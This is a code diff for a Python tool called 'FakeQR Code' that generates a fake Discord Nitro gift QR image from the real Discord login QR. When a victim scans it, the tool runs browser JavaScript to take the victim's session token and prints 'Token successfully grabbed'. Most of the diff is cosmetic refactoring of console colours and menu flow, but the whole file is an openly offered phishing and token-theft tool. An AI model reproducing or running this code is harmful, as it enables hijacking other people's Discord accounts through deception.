@@ -4,13 +4,14 @@ from selenium import webdriver
 from PIL import Image
 from bs4 import BeautifulSoup
 
-def main():
-    ctypes.windll.kernel32.SetConsoleTitleW("FakeQR Code - Made by Astraa")
-    fakeqr()
-    print(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Disfunction: \n""")
-    print(f"""          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Do not close the GoogleChrome window or you will not be able to log in\n""")
-    print(f"""          {Fore.LIGHTYELLOW_EX }[{Fore.LIGHTRED_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } The FakeNitro expires after 1min20, so be quick\n\n\n""")
-    input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to continue""")
+def fakeqr():
+    os.system(f'title FakeQR Code - Made by Astraa')
+    os.system('cls')
+    fakeqrtitle()
+    print(f"""{y}[{w}+{y}]{w} Disfunction: \n""")
+    print(f"""          {y}[{Fore.LIGHTRED_EX }!{y}]{w} Do not close the GoogleChrome window or you will not be able to log in\n""")
+    print(f"""          {y}[{Fore.LIGHTRED_EX }!{y}]{w} The FakeNitro expires after 1min20, so be quick\n\n\n""")
+    input(f"""{y}[{b}#{y}]{w} Press ENTER to continue""")
     options = webdriver.ChromeOptions()
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
     options.add_experimental_option('detach', True)
@@ -34,7 +35,7 @@ def main():
     discord = discord.resize(size=(40, 40))
     bg.paste(discord, (130, 355), discord)
     bg.save('temp/NitroGift.png')
-    print(f"""\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTGREEN_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } QR Code has been generated - [Image: "temp/NitroGift.png"] \n""")
+    print(f"""\n{y}[{Fore.LIGHTGREEN_EX }+{y}]{w} QR Code has been generated - [Image: "temp/NitroGift.png"] \n""")
     while True:
         if discord_login != driver.current_url:
             token = driver.execute_script('''
@@ -54,10 +55,10 @@ def main():
         }
     return token;   
                 ''')
-            print(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTWHITE_EX }+{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } A token has been found: {token}""")
+            print(f"""{y}[{w}+{y}]{w} A token has been found: {token}""")
             break
-    print(f"""\n\n{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTGREEN_EX }!{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } The FakeNitro has been scanned - Token successfully grabbed""")
-    input(f"""{Fore.LIGHTYELLOW_EX }[{Fore.LIGHTBLUE_EX }#{Fore.LIGHTYELLOW_EX }]{Fore.LIGHTWHITE_EX } Press ENTER to exit""")
-    exit(0)
+    print(f"""\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} The FakeNitro has been scanned - Token successfully grabbed""")
+    input(f"""{y}[{b}#{y}]{w} Press ENTER to exit""")
+    main()
 
-main()
+fakeqr()
